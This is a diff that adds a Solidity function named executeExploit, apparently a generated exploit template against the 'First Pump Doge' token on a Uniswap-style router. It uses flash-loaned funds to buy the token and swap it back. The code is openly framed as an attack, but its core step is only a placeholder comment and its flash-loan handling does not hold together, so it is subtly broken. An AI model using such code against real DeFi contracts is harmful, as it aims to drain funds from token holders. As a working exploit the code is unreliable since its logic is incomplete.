@@ -1,0 +1,33 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Flash Loan valuableToken
+    // Here we already have an amount from the flash loan we acquired earlier
+    // The amount is assumed to be transferred into the contract by the flash loan provider
+
+    // Step 2: Swap WBNB for First Pump Doge tokens
+    address[] memory path = new address[](2);
+    path[0] = uniswapRouter.WETH();
+    path[1] = token; // This is the First Pump Doge token
+
+    // Swap WBNB for First Pump Doge tokens using the flash loan
+    IUniswapV2Router(uniswapRouter).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, address(this), block.timestamp);
+
+    // Step 3: Further interactions with First Pump Doge contract
+    // For example, triggering the emission of dividends or increasing liquidity
+    uint256 tokenBalance = IERC20(token).balanceOf(address(this));
+    if(tokenBalance > 0) {
+        // Approve the router to spend tokens
+        IERC20(token).approve(uniswapRouter, tokenBalance);
+
+        // Step 4: Convert back to WBNB
+        address[] memory pathBack = new address[](2);
+        pathBack[0] = token;
+        pathBack[1] = uniswapRouter.WETH();
+
+        // Swap back to WBNB
+        IUniswapV2Router(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(tokenBalance, 0, pathBack, address(this), block.timestamp);
+    }
+}
+</executeExploitCode>
+```
